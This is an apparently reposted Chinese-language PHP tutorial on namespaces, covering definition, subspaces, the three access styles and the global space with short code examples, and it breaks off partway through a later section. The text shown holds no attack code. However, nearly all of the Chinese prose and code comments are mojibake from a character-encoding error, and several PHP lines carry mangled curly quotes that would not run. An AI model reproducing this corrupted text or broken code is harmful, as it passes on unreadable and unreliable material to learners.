        <content type="html"><![CDATA[<h4 id="è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"><a href="#è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ" class="headerlink" title="è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"></a>è½¬è½½äºï¼š<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">é»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ</a></h4><h1 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a><strong>å‘½åç©ºé—´</strong></h1><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šç†è§£å‘½åç©ºé—´çš„æ¦‚å¿µï¼ŒæŒæ¡å‘½åç©ºé—´å­˜åœ¨çš„ä»·å€¼ä»¥åŠè§£å†³çš„å®é™…é—®é¢˜ï¼Œåˆ©ç”¨å‘½åç©ºé—´å®ç°å¤æ‚é¡¹ç›®å¼€å‘</p></blockquote><ul><li>å‘½åç©ºé—´åŸºç¡€</li><li>å­ç©ºé—´</li><li>å‘½åç©ºé—´è®¿é—®</li><li>å…¨å±€ç©ºé—´</li><li>å‘½åç©ºé—´å¼•å…¥</li></ul><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å‘½åç©ºé—´</strong>ï¼šnamespaceï¼ŒæŒ‡äººä¸ºçš„å°†å†…å­˜è¿›è¡Œ<code>åˆ†éš”</code>ï¼Œè®©ä¸åŒå†…å­˜åŒºåŸŸçš„åŒåç»“æ„å…±å­˜ï¼Œä»è€Œè§£å†³åœ¨å¤§å‹é¡¹ç›®ä¸­å¯èƒ½å‡ºç°çš„é‡åç»“æ„é—®é¢˜</p><ul><li>PHPä¸­ï¼ŒåŒä¸€è„šæœ¬è¿è¡Œå‘¨æœŸå†…ä¸å…è®¸å‡ºç°åŒåç»“æ„<ul><li>å¸¸é‡</li><li>å‡½æ•°</li><li>ç±»ï¼ˆæ¥å£ï¼‰</li></ul></li><li>åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œé™¤äº†ä½¿ç”¨å¤æ‚çš„å‘½åæ–¹å¼ï¼Œå¾ˆéš¾é¿å…å›¢é˜Ÿé—´ä½¿ç”¨åŒåç»“æ„</li><li>å‘½åç©ºé—´å¯ä»¥é€šè¿‡ç»™å„ç±»å‘½åå¢åŠ <code>è·¯å¾„</code>æ¥å®ç°ä¸åŒåå­—çš„â€œæœ¬è´¨ä¸åŒâ€ï¼Œä»è€Œå…è®¸åŒåå­˜åœ¨</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>åœ¨Windowsç³»ç»Ÿä¸‹ï¼šåŒä¸€ä¸ªç£ç›˜ä¸Šä¸å…è®¸å‡ºç°åŒåæ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è·¯å¾„çš„æ–¹å¼ï¼ˆæ–‡ä»¶å¤¹ï¼‰å®ç°åŒåæ–‡ä»¶å­˜</p><pre><code>index.phpindex(1).php            # ç³»ç»Ÿä¸å…è®¸åŒåï¼Œæ‰€ä»¥ä¼šé‡å‘½å</code></pre><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸åŒçš„è·¯å¾„å’Œé€»è¾‘åˆ†åŒºæ¥å®ç°åŒåæ–‡ä»¶å…±åŒå­˜åœ¨</p><pre><code>C:/index.phpD:/index.phpD:/server/web/index.php    # å¯ä»¥åŒæ—¶å­˜åœ¨ï¼šè·¯å¾„æœ¬èº«å¯ä»¥ç†è§£ä¸ºæ–‡ä»¶çš„åå­—ï¼ˆä¸‰ä¸ªéƒ½ä¸åŒï¼‰</code></pre><ul><li>å‘½åç©ºé—´å°±æ˜¯ç±»ä¼¼ä¸Šè¿°çš„æ“ä½œï¼Œåœ¨åŒä¸€å—å†…å­˜é‡Œè¿›è¡Œ<code>é€»è¾‘åˆ†åŒº</code>å®ç°åŒåç»“æ„çš„åŒæ—¶å­˜åœ¨</li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€å‘½åç©ºé—´æ˜¯ä¸ºäº†è§£å†³ç»“æ„åŒåé—®é¢˜è€Œå‡ºç°çš„ä¸€ç§è§£å†³æ–¹æ¡ˆ</p><p>2ã€å‘½åç©ºé—´æœ¬è´¨æ˜¯åœ¨å†…å­˜ä¸­è¿›è¡Œé€»è¾‘åˆ’åˆ†ï¼Œè®©ç›¸åŒçš„åå­—åˆ†åˆ°ä¸åŒçš„åŒºåŸŸï¼Œä»è€Œå®ç°<code>ä¸åŒå</code></p><h2 id="1ã€å‘½åç©ºé—´åŸºç¡€"><a href="#1ã€å‘½åç©ºé—´åŸºç¡€" class="headerlink" title="1ã€å‘½åç©ºé—´åŸºç¡€"></a><strong>1ã€å‘½åç©ºé—´åŸºç¡€</strong></h2><blockquote><p>ç›®æ ‡ï¼šäº†è§£å‘½åç©ºé—´çš„åŸºæœ¬è¯­æ³•ï¼ŒæŒæ¡å‘½åç©ºé—´çš„é™åˆ¶é€»è¾‘å’ŒåŸºæœ¬åº”ç”¨</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å‘½åç©ºé—´åŸºç¡€</strong>ï¼šå‘½åç©ºé—´çš„åŸºæœ¬è¯­æ³•å’Œä½œç”¨</p><ul><li><p>å‘½åç©ºé—´ä½¿ç”¨namespaceå…³é”®å­—å®šä¹‰ç©ºé—´</p><p>namespace å‘½åç©ºé—´åå­—;</p></li><li><p>å‘½åç©ºé—´å¿…é¡»å®šä¹‰åœ¨æ‰€æœ‰ä»£ç ä¹‹å‰ï¼ˆå‰é¢ä¸èƒ½æœ‰ä»»ä½•ä»£ç æ€§çš„å†…å®¹ï¼Œæ³¨é‡Šé™¤å¤–ï¼‰</p></li><li>å‘½åç©ºé—´åå¯ä»¥å†™ä»»æ„å†…å®¹ï¼Œä½†æ˜¯åªæœ‰å‘½åç©ºé—´å…ƒç´ çœŸæ­£å—ç©ºé—´é™åˆ¶</li><li>å‘½åç©ºé—´å…ƒç´ æ˜¯ç»“æ„æ€§å†…å®¹ï¼ˆä¸å…è®¸é‡å¤çš„å†…å®¹ï¼‰ï¼Œæœ‰ä¸‰ç±»ï¼š<ul><li>å¸¸é‡</li><li>å‡½æ•°</li><li>ç±»ï¼ˆæ¥å£ï¼‰</li></ul></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€ç¡®å®šä½¿ç”¨å‘½åç©ºé—´ï¼šæœ‰ä¸€äº›ç»“æ„æ€§çš„å†…å®¹å¯èƒ½ä¸å…¶ä»–å¼€å‘è€…å†²çªï¼ˆé‡åï¼‰</p><p>2ã€åœ¨ä¸€å¼€å§‹å®šä¹‰å‘½åç©ºé—´</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€åŸºæœ¬è¯­æ³•ï¼šnamespace ç©ºé—´åå­—;</p><pre><code># å®šä¹‰ç©ºé—´namespace my_space;            # å®šä¹‰ä¸€ä¸ªå«åšmy_spaceçš„ç©ºé—´</code></pre><p>2ã€å‘½åç©ºé—´çš„å‘½åè§„åˆ™</p><ul><li>ç”±å­—æ¯ã€ä¸‹åˆ’çº¿å’Œæ•°å­—æ„æˆ</li><li>å¯ä»¥ä»¥å­—æ¯å’Œä¸‹åˆ’çº¿å¼€å¤´</li><li>è¾ƒå°‘å‡ºç°å¤šå•è¯ç©ºé—´åï¼Œä¸€èˆ¬ä½¿ç”¨ä¸‹åˆ’çº¿æ³•</li></ul><p>3ã€å‘½åç©ºé—´çš„ä½œç”¨ï¼šèƒ½å¤Ÿåˆ›å»ºåŒåç»“æ„ï¼ŒåŒ…å«å‡½æ•°ã€å¸¸é‡å’Œç±»</p><pre><code>namespace space1;function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}const PI = 3;class Human{}namespace space2;function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}const PI = 3.14;class Human{}</code></pre><p>4ã€å‘½åç©ºé—´é‡Œçš„å†…å®¹</p><ul><li>å‘½åç©ºé—´é‡Œå¯ä»¥å®šä¹‰åŒåçš„å‡½æ•°ã€å¸¸é‡å’Œç±»ï¼ˆç»“æ„ï¼‰ï¼šå› ä¸ºæ­¤ç±»ç»“æ„ä¸å…è®¸åŒåï¼Œè¿™äº›æ˜¯å‘½åç©ºé—´è§„èŒƒçš„ç›®æ ‡ï¼ˆç§°ä¸ºç©ºé—´å…ƒç´ ï¼‰</li><li><p>å‘½åç©ºé—´é‡Œå¯ä»¥æœ‰å…¶ä»–ä»£ç </p><p>namespace space;<br>class Human{}<br>function display(){}<br>const PI = 3.14;<br>$a = 100;<br>echo $a;</p></li></ul><p>5ã€å‘½åç©ºé—´æ³¨æ„äº‹é¡¹ï¼šå‘½åç©ºé—´çš„å£°æ˜ï¼ˆç¬¬ä¸€æ¬¡ï¼‰å¿…é¡»åœ¨æ‰€æœ‰ä»£ç ä¹‹å‰</p><pre><code># å‘½åç©ºé—´ä¹‹å‰ä¸èƒ½æœ‰ä»»ä½•ä»£ç namespace space1;                # æ­£ç¡®echo &apos;test&apos;;namespace space1;                # é”™è¯¯ï¼šç¬¬ä¸€æ¬¡å‘½åç©ºé—´ä¹‹å‰ä¸èƒ½æœ‰ä»»ä½•å…¶ä»–ä»£ç </code></pre><p><strong>æ³¨æ„</strong>ï¼šå‘½åç©ºé—´åœ¨ä¸€ä¸ªè„šæœ¬ä¸­åªä¼šå®šä¹‰ä¸€ä¸ªï¼ˆæœ€å¼€å§‹ï¼‰ï¼Œä½†æ˜¯åœ¨è®²è¯¾çš„æ—¶å€™å¯èƒ½ä¼šå®šä¹‰å¤šä¸ª</p><blockquote><p>å°ç»“</p></blockquote><p>1ã€å‘½åç©ºé—´æ˜¯ä½¿ç”¨namespace + ç©ºé—´åå­—å®šä¹‰</p><p>2ã€ä¸åŒå‘½åç©ºé—´é‡Œå¯ä»¥å®šä¹‰åŒåçš„å‡½æ•°ã€å¸¸é‡å’Œç±»ï¼ˆåŒåç»“æ„ï¼‰</p><p>3ã€å‘½åç©ºé—´é‡Œå¯ä»¥ä¹¦å†™ä»»æ„ä»£ç </p><p>4ã€å‘½åç©ºé—´çš„å®šä¹‰å¿…é¡»åœ¨è„šæœ¬çš„æœ€å‰é¢</p><p>5ã€ä¸€ä¸ªè„šæœ¬ä¸­é€šå¸¸åªä¼šå®šä¹‰ä¸€ä¸ªç©ºé—´</p><p>6ã€å‘½åç©ºé—´å…¶å®å°±å¥½æ¯”æ˜¯ç£ç›˜ä¸Šåˆ’åˆ†çš„ä¸åŒæ–‡ä»¶å¤¹ï¼Œç”¨æ¥ä¿å­˜åŒåæ–‡ä»¶</p><h2 id="2ã€å‘½åç©ºé—´å­ç©ºé—´"><a href="#2ã€å‘½åç©ºé—´å­ç©ºé—´" class="headerlink" title="2ã€å‘½åç©ºé—´å­ç©ºé—´"></a><strong>2ã€å‘½åç©ºé—´å­ç©ºé—´</strong></h2><blockquote><p>ç›®æ ‡ï¼šç†è§£å­ç©ºé—´çš„æ¦‚å¿µï¼ŒæŒæ¡å­ç©ºé—´çš„åˆ›å»ºè§„èŒƒ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å­ç©ºé—´</strong>ï¼šsubspaceï¼Œå³åœ¨å·²æœ‰ç©ºé—´ä¹‹ä¸Šï¼Œå†åœ¨å†…éƒ¨è¿›è¡Œç©ºé—´åˆ’åˆ†ï¼Œè®©æ¯ä¸ªå°ç©ºé—´ç‹¬ç«‹èµ·æ¥ã€‚</p><ul><li>å­ç©ºé—´å…¶å®å°±æ˜¯è·¯å¾„çš„åˆ†å±‚</li><li><p>å­ç©ºé—´å¯ä»¥åŸºäºå·²æœ‰ç©ºé—´åˆ›å»ºï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ›å»ºï¼Œä½¿ç”¨åæ–œæ åˆ†éš”<code>\</code></p><h1 id="åŸºäºå·²æœ‰çˆ¶ç©ºé—´"><a href="#åŸºäºå·²æœ‰çˆ¶ç©ºé—´" class="headerlink" title="åŸºäºå·²æœ‰çˆ¶ç©ºé—´"></a>åŸºäºå·²æœ‰çˆ¶ç©ºé—´</h1><p>namespace father;<br>namespace father\son;</p><h1 id="ç›´æ¥åˆ›å»ºå­ç©ºé—´"><a href="#ç›´æ¥åˆ›å»ºå­ç©ºé—´" class="headerlink" title="ç›´æ¥åˆ›å»ºå­ç©ºé—´"></a>ç›´æ¥åˆ›å»ºå­ç©ºé—´</h1><p>namespace mother\daughter;</p></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å‘½åç©ºé—´å­ç©ºé—´æ˜¯ç›´æ¥é€šè¿‡namespace+è·¯å¾„ç¬¦å·<code>\</code>å®ç°</p><pre><code>namespace space;        # åˆ›å»ºä¸€ä¸ªä¸€çº§ç©ºé—´function display(){}# åˆ›å»ºå­ç©ºé—´namespace space\space1;    # åœ¨spaceç©ºé—´ä¸‹åˆ›å»ºä¸€ä¸ªå«åšspace1çš„å­ç©ºé—´function display(){}</code></pre><p>2ã€å­ç©ºé—´çš„åˆ›å»ºä¸ä¸€å®šéè¦åœ¨å‰é¢åˆ›å»ºäº†ä¸Šçº§ç©ºé—´ï¼Œå³å¯ä»¥ç›´æ¥åœ¨æŸä¸ªè„šæœ¬ä¸­åˆ›å»ºå­ç©ºé—´</p><pre><code># è„šæœ¬æœ€ä¸Šé¢namespace space\space2;function display(){}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€å­ç©ºé—´ä¹Ÿæ˜¯é€šè¿‡namespaceå®ç°ï¼Œç”¨namespace+<code>\</code>åŒºåˆ†ä¸Šä¸‹çº§ç©ºé—´å</p><p>2ã€åŸºäºä¸€ä¸ªè„šæœ¬ä¸­é€šå¸¸åªæœ‰ä¸€ä¸ªç©ºé—´åï¼Œæ‰€ä»¥å­ç©ºé—´çš„åˆ›å»ºå¯ä»¥ç›´æ¥åˆ›å»º</p><ul><li>ä¸ç”¨ä¸€å®šå…ˆåˆ›å»ºä¸€çº§ç©ºé—´</li><li>ä½†æ˜¯ä¸€èˆ¬æ˜¯å­˜åœ¨ä¸Šçº§ç©ºé—´çš„ï¼Œè€Œä¸æ˜¯å‡­ç©ºåˆ›å»ºå­ç©ºé—´</li></ul><p>3ã€å­ç©ºé—´ç†è®ºä¸Šå¯ä»¥åˆ›å»ºæ— é™å¤šå±‚ï¼Œä½†æ˜¯å®é™…å±‚æ¬¡æ ¹æ®é¡¹ç›®éœ€æ±‚ç¡®å®šï¼ˆä¸€èˆ¬ä¸è¶…è¿‡å››å±‚ï¼‰</p><h2 id="3ã€å‘½åç©ºé—´è®¿é—®"><a href="#3ã€å‘½åç©ºé—´è®¿é—®" class="headerlink" title="3ã€å‘½åç©ºé—´è®¿é—®"></a><strong>3ã€å‘½åç©ºé—´è®¿é—®</strong></h2><blockquote><p>ç›®æ ‡ï¼šæŒæ¡å‘½åç©ºé—´çš„å…ƒç´ è°ƒç”¨æ–¹å¼ï¼Œèƒ½å¤Ÿç”¨åˆé€‚çš„æ–¹å¼è°ƒç”¨ç©ºé—´å…ƒç´ </p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å‘½åç©ºé—´è®¿é—®</strong>ï¼šæ˜¯æŒ‡è®¿é—®ä¸åŒç©ºé—´é‡Œçš„ç»“æ„å…ƒç´ </p><ul><li>ç©ºé—´é‡Œæœ‰é™¤äº†å‡½æ•°ã€å¸¸é‡å’Œç±»çš„å…¶ä»–ä»£ç ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œåªæœ‰ç©ºé—´å…ƒç´ æœ¬èº«ï¼ˆå‡½æ•°ã€å¸¸é‡å’Œç±»ï¼‰æ˜¯éœ€è¦é€šè¿‡ç©ºé—´è¿›è¡Œè®¿é—®çš„</li><li>åœ¨PHPå‘½åç©ºé—´ä¸­ï¼Œæä¾›äº†ä¸‰ç§ç©ºé—´å…ƒç´ çš„è®¿é—®æ–¹å¼<ul><li><code>éé™å®šåç§°</code>ï¼šç›´æ¥è®¿é—®å…ƒç´ åï¼Œç³»ç»Ÿè‡ªåŠ¨åŒ¹é…å½“å‰ç©ºé—´ï¼ˆå‘ä¸Šæ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªç©ºé—´ï¼‰</li><li><code>é™å®šåç§°</code>ï¼šå¸¦ç©ºé—´åå­—ï¼Œè€Œä¸”æ˜¯åŸºäºå½“å‰ç©ºé—´çš„å­ç©ºé—´ï¼ˆç›¸å¯¹è·¯å¾„ï¼Œåœ¨å½“å‰ç©ºé—´ä¸‹ï¼Œæ‰¾åˆ°å‘ä¸‹çš„ç©ºé—´çš„ï¼‰</li><li><code>å®Œå…¨é™å®šåç§°</code>ï¼šä»å…¨å±€ç©ºé—´ï¼ˆæ ¹ç›®å½•ï¼‰å¼€å§‹è®¿é—®ï¼ˆç»å¯¹è·¯å¾„ï¼‰</li></ul></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€éé™å®šåç§°è®¿é—®ï¼šå³ç›´æ¥è®¿é—®ç©ºé—´å…ƒç´ çš„åå­—ï¼Œæ­¤ç±»è®¿é—®è®¿é—®çš„æ˜¯å½“å‰ä»£ç æ‰€å±ç©ºé—´å†…çš„å…ƒç´ </p><pre><code>namespace space1;function display(){    echo &apos;space1&apos;;}namespace space2;function display(){    echo &apos;space2&apos;;}# éé™å®šåç§°è®¿é—®display();                # è¾“å‡ºspace2ï¼Œå› ä¸ºå½“å‰displayå‡½æ•°è°ƒç”¨æ‰€å±ç©ºé—´ä¸ºspace2</code></pre><p><strong>æ³¨æ„</strong>ï¼šéé™å®šåç§°è®¿é—®å°±å¥½æ¯”æ˜¯è®¿é—®å½“å‰è‡ªå·±æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><p>2ã€é™å®šåç§°è®¿é—®ï¼Œå³åœ¨è®¿é—®å…ƒç´ çš„å‰é¢ä½¿ç”¨ç›¸åº”çš„ç©ºé—´åå­—ï¼Œéé™å®šåç§°çš„è®¿é—®æ˜¯åŸºäºå­ç©ºé—´æ¥å®ç°çš„</p><pre><code># å®šä¹‰å­ç©ºé—´namespace space\space1;function display(){    echo &apos;space\space1&lt;br/&gt;&apos;;}# å®šä¹‰å­ç©ºé—´namespace space\space2;function display(){    echo &apos;space\space2&lt;br/&gt;&apos;;}# æ‰€å±çˆ¶ç©ºé—´namespace space;function display(){    echo &apos;space&lt;br/&gt;&apos;;}# éé™å®šåç§°è®¿é—®display();                     # spaceï¼šå½“å‰å‘ä¸Šæ‰€å±ç©ºé—´space1\display();             # space\space1ï¼šå®é™…ä¸ºå½“å‰ç©ºé—´space + space1\display()</code></pre><p><strong>æ³¨æ„</strong>ï¼šé™å®šåç§°è®¿é—®å¥½æ¯”è®¿é—®å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„å­æ–‡ä»¶å¤¹å†…å®¹ï¼ˆé’ˆå¯¹å½“å‰ç©ºé—´çš„å­ç©ºé—´è®¿é—®ï¼‰</p><p>3ã€å®Œå…¨é™å®šåç§°è®¿é—®ï¼Œå³ä»æ ¹ç›®å½•ï¼ˆå…¨å±€ç©ºé—´ï¼‰å¼€å§‹è®¿é—®ï¼Œä½¿ç”¨<code>\</code>ä½œä¸ºå…¨å±€ç©ºé—´å¼€å§‹ç¬¦å·</p><pre><code># æ¥ä¸Šè¿°ä»£ç # å®Œå…¨é™å®šåç§°è®¿é—®\space\display();            # spaceç©ºé—´ä¸‹çš„display\space\space1\display();     # spaceä¸‹space1ç©ºé—´çš„display</code></pre><p><strong>æ³¨æ„</strong>ï¼šå®Œå…¨é™å®šåç§°è®¿é—®å¥½æ¯”ä»ç£ç›˜æ ¹ç›®å½•è®¿é—®å¯¹åº”è·¯å¾„ä¸‹çš„å†…å®¹ï¼ˆç»å¯¹è·¯å¾„ï¼‰</p><blockquote><p>å°ç»“</p></blockquote><p>1ã€å‘½åç©ºé—´çš„è®¿é—®åˆ†ä¸ºä¸‰ç§æ¨¡å¼</p><ul><li>éé™å®šåç§°è®¿é—®ï¼Œç›´æ¥è®¿é—®å…ƒç´ æœ¬èº«ï¼Œä»£è¡¨å½“å‰æ‰€å±ç©ºé—´ï¼ˆå½“å‰ç›®å½•ï¼‰</li><li>é™å®šåç§°è®¿é—®ï¼Œä½¿ç”¨ç©ºé—´å+å…ƒç´ ï¼Œä»£è¡¨è®¿é—®<strong>å½“å‰ç©ºé—´å­ç©ºé—´</strong>ï¼ˆå½“å‰ç›®å½•å­ç›®å½•ï¼‰</li><li>å®Œå…¨é™å®šåç§°è®¿é—®ï¼Œä½¿ç”¨å…¨å±€ç©ºé—´å¼€å§‹ï¼Œä»£è¡¨ä»å…¨å±€å¼€å§‹è¿›è¡Œè®¿é—®ï¼ˆæ ¹ç›®å½•ï¼‰</li></ul><p>2ã€ç©ºé—´å…ƒç´ è®¿é—®æ–¹å¼é€‰æ‹©</p><ul><li>å½“å‰ç©ºé—´å†…ï¼Œä¸€èˆ¬ä½¿ç”¨<code>éé™å®šåç§°</code>è®¿é—®</li><li>ä¸åœ¨å½“å‰ç©ºé—´ï¼Œä¸€èˆ¬ä½¿ç”¨<code>å®Œå…¨é™å®šåç§°</code>è®¿é—®</li><li>åœ¨å®é™…å¼€å‘ä¸­ï¼šæˆ‘ä»¬ä¼šå¯¹é¡¹ç›®è¿›è¡Œæ·±åº¦å°è£…å¤„ç†ï¼Œå°½é‡è®©å¼€å‘è€…å¯ä»¥ä½¿ç”¨éé™å®šåç§°è®¿é—®ï¼ˆå¼€å‘æ•ˆç‡é«˜ï¼‰</li></ul><h2 id="4ã€å…¨å±€ç©ºé—´"><a href="#4ã€å…¨å±€ç©ºé—´" class="headerlink" title="4ã€å…¨å±€ç©ºé—´"></a><strong>4ã€å…¨å±€ç©ºé—´</strong></h2><blockquote><p>ç›®æ ‡ï¼šäº†è§£å…¨å±€ç©ºé—´çš„æ¦‚å¿µï¼ŒæŒæ¡å…¨å±€ç©ºé—´ä¸å…¶ä»–å‘½åç©ºé—´çš„å…³ç³»ä»¥åŠåˆä½œæ¨¡å¼</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å…¨å±€ç©ºé—´</strong>ï¼šå³ç©ºé—´å…ƒç´ åœ¨æ²¡æœ‰å®šä¹‰ç©ºé—´çš„æƒ…å†µä¸‹æ‰€å±çš„ç©ºé—´ï¼Œä¹Ÿæ˜¯æ‰€æœ‰å®šä¹‰çš„ç©ºé—´çš„é¡¶çº§ç©ºé—´</p><ul><li>æ‰€æœ‰ç©ºé—´éƒ½æ˜¯ä»å…¨å±€ç©ºé—´åˆ†ç¦»å‡ºæ¥çš„</li><li>æ‰€æœ‰ä¸æŒ‡å®šç©ºé—´çš„å…ƒç´ æœ¬è´¨éƒ½å±äºå…¨å±€ç©ºé—´</li><li>å…¨å±€ç©ºé—´ä¸å…¶ä»–ç©ºé—´å­˜åœ¨ç©ºé—´çº¦æŸå…³ç³»ï¼Œåœ¨è¿›è¡Œæ–‡ä»¶åŒ…å«æ—¶éœ€è¦æ³¨æ„åˆ°ç©ºé—´å…³ç³»</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€æ²¡æœ‰æŒ‡å®šç©ºé—´çš„å…ƒç´ æ‰€å±çš„ç©ºé—´å±äºå…¨å±€ç©ºé—´</p><pre><code># ä¸å®šä¹‰ç©ºé—´function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}</code></pre><p>2ã€æ‰€æœ‰çš„ç©ºé—´æœ¬è´¨éƒ½æ˜¯åœ¨å…¨å±€ç©ºé—´ä¸‹çš„åˆ’åˆ†</p><pre><code># å®šä¹‰ç©ºé—´namespace space;function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}# spaceç©ºé—´å±äºä»å…¨å±€ç©ºé—´é‡Œåˆ’åˆ†å‡ºä¸€éƒ¨åˆ†ç”¨äºspaceç©ºé—´ç®¡ç†</code></pre><p>3ã€å…¨å±€ç©ºé—´å…ƒç´ çš„è®¿é—®ï¼šä½¿ç”¨å®Œå…¨é™å®šåç§°è®¿é—®</p><pre><code># ä¸å®šä¹‰ç©ºé—´function display(){    echo __NAMESPACE__,&apos;&lt;br/&gt;&apos;;}display();                            # éé™å®šåç§°è®¿é—®ï¼šæœ¬èº«å½“å‰å°±æ˜¯å…¨å±€ç©ºé—´å†…ï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®\display();                            # å®Œå…¨é™å®šåç§°è®¿é—®ï¼šå…¨å±€ç¬¦å·&quot;\&quot;+å…¨å±€ç©ºé—´å…ƒç´ </code></pre><p>4ã€ä¸€æ—¦å‘½åç©ºé—´å‡ºç°ï¼Œé‚£ä¹ˆç©ºé—´å…ƒç´ ï¼ˆç±»ã€å¸¸é‡å’Œå‡½æ•°ï¼‰çš„è®¿é—®å°±è¢«é™å®šåœ¨ç©ºé—´å†…ï¼Œå¦‚æœä½¿ç”¨éé™å®šåç§°è®¿é—®ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šä»¥ä¸‹è§£æé€»è¾‘ï¼ˆé™å®šåç§°æˆ–è€…å®Œå…¨é™å®šåç§°æ˜¯ç›´æ¥æŒ‰è·¯å¾„å‡†ç¡®æ‰¾ï¼‰</p><ul><li>é¦–å…ˆä¸€å®šæ˜¯åœ¨è‡ªå·±ç©ºé—´å†…æŸ¥æ‰¾</li><li><p>å¦‚æœæ‰¾ä¸åˆ°å…ƒç´ ï¼Œä¸åŒç©ºé—´å…ƒç´ çš„å¤„ç†ä¸åŒ</p><ul><li>ç³»ç»Ÿå¸¸é‡ã€ç³»ç»Ÿå‡½æ•°å¦‚æœæ‰¾ä¸åˆ°ï¼Œä¼šè‡ªåŠ¨å»å…¨å±€ç©ºé—´æ‰¾ï¼ˆä¹Ÿå°±æ˜¯èƒ½æ‰¾åˆ°ï¼‰</li><li>ç³»ç»Ÿç±»æ˜¯ä¸ä¼šè‡ªåŠ¨å»å…¨å±€ç©ºé—´æ‰¾çš„ï¼ˆæŠ¥é”™ï¼Œæç¤ºå½“å‰æ‰€å±ç©ºé—´å†…å…ƒç´ æ‰¾ä¸åˆ°ï¼‰</li></ul><h1 id="å®šä¹‰ç©ºé—´"><a href="#å®šä¹‰ç©ºé—´" class="headerlink" title="å®šä¹‰ç©ºé—´"></a>å®šä¹‰ç©ºé—´</h1><p>namespace space;<br>function display(){</p><pre><code>echo __FUNCTION__,&apos;&lt;br/&gt;&apos;;</code></pre><p>}</p><h1 id="å½“å‰æ‰€æœ‰è®¿é—®å¦‚æœä½¿ç”¨éé™å®šåç§°éƒ½ä»£è¡¨è®¿é—®å½“å‰ç©ºé—´å†…çš„å…ƒç´ "><a href="#å½“å‰æ‰€æœ‰è®¿é—®å¦‚æœä½¿ç”¨éé™å®šåç§°éƒ½ä»£è¡¨è®¿é—®å½“å‰ç©ºé—´å†…çš„å…ƒç´ " class="headerlink" title="å½“å‰æ‰€æœ‰è®¿é—®å¦‚æœä½¿ç”¨éé™å®šåç§°éƒ½ä»£è¡¨è®¿é—®å½“å‰ç©ºé—´å†…çš„å…ƒç´ "></a>å½“å‰æ‰€æœ‰è®¿é—®å¦‚æœä½¿ç”¨éé™å®šåç§°éƒ½ä»£è¡¨è®¿é—®å½“å‰ç©ºé—´å†…çš„å…ƒç´ </h1><p>display();                # spaceä¸‹çš„displayå‡½æ•°</p><h1 id="æƒ³è®¿é—®å‡½æ•°"><a href="#æƒ³è®¿é—®å‡½æ•°" class="headerlink" title="æƒ³è®¿é—®å‡½æ•°"></a>æƒ³è®¿é—®å‡½æ•°</h1><p>define(â€˜PIâ€™,3.14);        # æ­£ç¡®ï¼šspaceä¸‹æ²¡æœ‰defineå‡½æ•°ï¼Œä½†æ˜¯å…¨å±€ç©ºé—´æœ‰ï¼ˆç³»ç»Ÿå‡½æ•°å±äºå…¨å±€ç©ºé—´ï¼‰</p><h1 id="è®¿é—®ç³»ç»Ÿå¸¸é‡"><a href="#è®¿é—®ç³»ç»Ÿå¸¸é‡" class="headerlink" title="è®¿é—®ç³»ç»Ÿå¸¸é‡"></a>è®¿é—®ç³»ç»Ÿå¸¸é‡</h1><p>echo PHP_VERSION;        # æ­£ç¡®ï¼šspaceä¸‹æ²¡æœ‰ï¼Œä½†å…¨å±€ç©ºé—´æœ‰</p><h1 id="æƒ³è®¿é—®ç±»"><a href="#æƒ³è®¿é—®ç±»" class="headerlink" title="æƒ³è®¿é—®ç±»"></a>æƒ³è®¿é—®ç±»</h1><h1 id="m-new-Mysqli-â€˜localhostâ€™-â€™rootâ€™-â€™rootâ€™"><a href="#m-new-Mysqli-â€˜localhostâ€™-â€™rootâ€™-â€™rootâ€™" class="headerlink" title="$m = new Mysqli(â€˜localhostâ€™,â€™rootâ€™,â€™rootâ€™);"></a>$m = new Mysqli(â€˜localhostâ€™,â€™rootâ€™,â€™rootâ€™);</h1><pre><code># é”™è¯¯ï¼šç³»ç»Ÿæç¤ºspace\Mysqliä¸å­˜åœ¨</code></pre><h1 id="æ­£ç¡®æ–¹æ¡ˆ"><a href="#æ­£ç¡®æ–¹æ¡ˆ" class="headerlink" title="æ­£ç¡®æ–¹æ¡ˆ"></a>æ­£ç¡®æ–¹æ¡ˆ</h1><p>$m = new \Mysqli(â€˜localhostâ€™,â€™rootâ€™,â€™rootâ€™);</p></li></ul><p>5ã€åŒæ 